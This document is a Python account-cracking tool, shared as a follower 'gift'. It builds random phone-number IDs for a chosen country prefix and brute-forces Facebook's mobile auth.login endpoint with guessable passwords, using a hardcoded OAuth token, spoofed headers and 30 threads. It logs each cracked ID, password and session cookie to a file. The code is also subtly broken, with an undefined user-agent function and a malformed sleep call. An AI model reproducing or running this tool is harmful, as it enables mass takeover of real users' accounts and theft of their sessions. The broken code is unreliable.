#==========[INFO]=========#
#NAME :- RAFAT CHOWDHURY 
#PAGE NAME :- LEARN WITH RAFAT
#200 FOLLOWER SPECIAL GIFT
#-------------[import]-------------#
import os,random,string,re,sys,uuid,json,requests,time
from os import system as clr
from concurrent.futures import ThreadPoolExecutor as tred
session=requests.Session()
#----------[session_name]----------#
sys.stdout.write('\x1b]2; [MAX-RX]\x07')
#-------------color----------------#
G = '\x1b[38;5;48m';W = '\033[1;37m';R = '\x1b[38;5;196m'
#----------[loop]----------#
loop,oks,cps,user=0,[],[],[]
#-------------[logo]--------------#
logo =(f"""{W}
╔═╗╦╔═╗╔╦╗  ╔═╗╦═╗╔═╗╔╦╗  ╦═╗╔═╗╔═╗╔═╗╔╦╗
║ ╦║╠╣  ║   ╠╣ ╠╦╝║ ║║║║  ╠╦╝╠═╣╠╣ ╠═╣ ║ 
╚═╝╩╚   ╩   ╚  ╩╚═╚═╝╩ ╩  ╩╚═╩ ╩╚  ╩ ╩ ╩ 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[<>] FACEBOOK : RAFAT RX
[<>] GITHUB   : RAFAT CHOWDHURY 
[<>] VERSION  : \x1b[38;5;196m0.1\033[1;37m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  \033[1;41m\033[1;37mGIFT FOR 200 FAMILY IN MY SMALL PAGE\033[0m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

#----------[line]----------#
def linex():
	print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#-------------[clear]-------------#
def clear():
	clr('clear')
	print(logo)
#-------------[main]------------#
def MAIN():
	clear()
	print('\x1b[38;5;48m[<1>] RANDOM CLONE')
	print('[<0>] \x1b[38;5;196mEXIT TOOL')
	linex()
	rx = input(f'{W}SELECT :- ')
	if rx in ['1','01']:
		bd()
	elif rx in ['0']:
		exit()
#-------------[Number_Making]----------#
def bd():
	clear()
	print(f'{W}[{R}<>{W}]{G} EXAMPLE {R}:{G} +91639 {R}|{G} +91620 {R}|{G} +91720 ');linex()
	code = input(f"{W}[{G}<>{W}]{G} SELECT : {R} ")
	try:
		clear()
		print('\033[1;37m[\x1b[38;5;196m<>\033[1;37m] \x1b[38;5;48mEXAMPLE \x1b[38;5;196m: \x1b[38;5;48m1000 \x1b[38;5;196m| \x1b[38;5;48m2000 \x1b[38;5;196m|\x1b[38;5;48m 3000 ');linex()
		limit = int(input(f"{W}[{G}<>{W}]{G} SELECT : {R}"))
	except ValueError:
		limit = 5000
	for num in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as MAX:
		clear()
		tl = str(len(user))
		print(f'{W}[{R}<>{W}]{G} TOTAL ID {R}:',tl)
		print(f'{W}[{R}<>{W}]{G} SIM CODE {R}:',code)
		print(f'{W}[{R}<>{W}]{G} USER AIROPLANE FOR OK IDS');linex()
		for psx in user:
			ids = code+psx
			passlist = [psx[2:],psx,code+psx,code+psx[:3],'57273200','59039200','57575751']
			MAX.submit(rd1,ids,passlist)
	linex()
	print(f'[<>] \x1b[38;5;48mTOTAL OK \x1b[38;5;196m:\033[1;37m'+str(len(oks)))
#------------------- [user_agent] ---------------#

#----------------[method_crack]-------------------#
def rd1(ids,passlist):
	global loop,oks,cps,twf
	sys.stdout.write(f'\r \x1b[38;5;48m GIFT \033[1;37m| \x1b[38;5;48m[20/1/2024] \033[1;37m| \x1b[38;5;196m{loop} \033[1;37m| \033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
	try:
		for pas in passlist:
			data={'adid': str(uuid.uuid4()),'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()),'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
			head={'User-Agent': amsung(), 'Accept-Encoding':  'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}  
			po = requests.post('https://gr'+'ap'+'h'+'.facebook.com/method/auth.login',data=data,headers=head).json()
			if 'access_token' in po:
				coki = po["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				ids = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r\r [RAFAT-OK] '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
				print(f'\r\r [COOKIE] '+kuki+'')
				linex()
				open('/sdcard/RAFATXRANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
				oks.append(ids)
				break
			else:continue
		loop+=1
	except Exception as e:
		pass
#-------------[start]--------------#
if __name__ == '__main__':
	os.system('clear');os.system('git pull');time.sleep(20#214300)
MAIN()